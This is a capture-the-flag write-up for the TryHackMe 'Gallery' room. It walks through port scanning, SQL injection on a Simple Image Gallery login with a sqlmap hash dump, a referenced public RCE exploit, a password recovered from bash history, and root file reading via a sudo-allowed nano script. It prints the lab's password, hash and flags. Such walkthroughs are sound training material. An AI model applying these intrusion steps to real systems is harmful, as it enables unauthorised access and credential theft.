# Gallery THM writeup
<a href = "https://tryhackme.com/room/gallery666"> https://tryhackme.com/room/gallery666 </a>



<h3>1. Question: How many ports are open?</h3>  <br>
Lets start with an nmap scan to get the number of open ports in the server!
<br>

```
$ nmap 10.10.4.212          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 10:12 EDT
Nmap scan report for 10.10.4.212
Host is up (0.056s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 1.17 seconds
```

We have 3 open ports in the server, now we got the answer to the first question, **3**

<hr>

<h3>2. Question: What's the name of the CMS?</h3>
<br>
Opening the website on port 80, we get an apache ubuntu default page, this doesn't help much.. 
but we noticed that there is another web server running on port 8080! Lets check it!

Now the website provided us a login page and with the name of the CMS! **Simple Image Gallery**

<hr>

<h3>3. Question: What's the hash password of the admin user? </h3>
When sending a login request, i noticed that we get a suspicious response:

```
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('test') "}
```
Login page maybe got some SQL injection vulnerability!
Running sqlmap we can see it detected that the username paramater is vulnerable to an sql injection attack, now we could easily get the admin's passwords hash.
After some time, sqlmap found the hash of the password
```
$ sqlmap -r req.txt --dump
....
+----------------------------------+
| password                         |
+----------------------------------+
| a228b12a08b6527e7978cbe5d914531c |
+----------------------------------+
```

<hr>
<h3>4. Question: What's the user flag?</h3>
To get the user flag, we have to gain a shell on the system.
<br>
I searched for the CMS name and found a possible RCE exploit on exploit-db:
<a href = "https://www.exploit-db.com/exploits/50214"> https://www.exploit-db.com/exploits/50214 </a> <br>
I downloaded this to my machine and i ran it. It successfully gave me a shell on the target system!
<br><br>
Only the user "mike" can read the user.txt, so we have to find a way to be mike!

```
www-data@ip-10-10-191-82:/home/mike$ ls -l
ls -l
total 12
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 2 mike mike 4096 May 24  2021 images
-rwx------ 1 mike mike   32 May 14  2021 user.txt
```

I downloaded linpeas, and ran it. While i was checking the output i noticed that when mike tried to use the command "sudo -l"
he did a typo, and revealed his password in the bash history
```
╔══════════╣ Searching passwords in history files
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l
```

Now i could login to his account with mikes password: **"b3stpassw0rdbr0xx"** and read the user.txt!
```
mike@ip-10-10-191-82:~$ cat user.txt
THM{af05cd30bfed67849befd546ef}
```

<hr>

<h3>5. Question: What's the root flag?</h3>
I ran sudo -l and i noticed there is a program that i can run as root without password

```
mike@ip-10-10-191-82:/opt$ sudo -l
Matching Defaults entries for mike on ip-10-10-191-82:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-10-191-82:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```
<br><br>
What's inside of it?
```
mike@ip-10-10-191-82:/opt$ cat rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```
Aha, so if i run it as root, and write "read" in the input box (which will the sh script provide) it will open a nano UI as root!<br>
So basically if you have nano run as root, you can read any file on the system, and if we go with the /root/root.txt
it will paste the root flag in to the nano editor
<img src = "rootflag.png">
